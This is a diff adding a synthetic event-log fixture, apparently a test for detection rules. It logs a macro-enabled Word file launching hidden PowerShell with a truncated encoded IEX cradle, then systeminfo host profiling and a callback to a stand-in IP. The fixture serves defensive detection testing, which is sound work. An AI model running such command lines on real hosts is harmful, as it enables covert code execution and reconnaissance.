@@ -1,0 +1,6 @@
+# Malicious Word document: Word launches encoded PowerShell, which then profiles the host
+# Expected: T1059.001 (R001), T1566.001 (R018, chained off R001), T1082 (R014)
+2026-10-14 09:12:01 EventType=ProcessCreate Image="C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" ParentImage=C:\Windows\explorer.exe CommandLine="WINWORD.EXE /n invoice_oct.docm" User=FINANCE\asha
+2026-10-14 09:12:07 EventType=ProcessCreate Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentImage="C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" CommandLine="powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" User=FINANCE\asha
+2026-10-14 09:12:15 EventType=ProcessCreate Image=C:\Windows\System32\systeminfo.exe ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="systeminfo > C:\Users\asha\AppData\Local\Temp\si.txt" User=FINANCE\asha
+2026-10-14 09:13:40 EventType=NetworkConnect Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe DestinationIp=198.51.100.23 DestinationPort=443
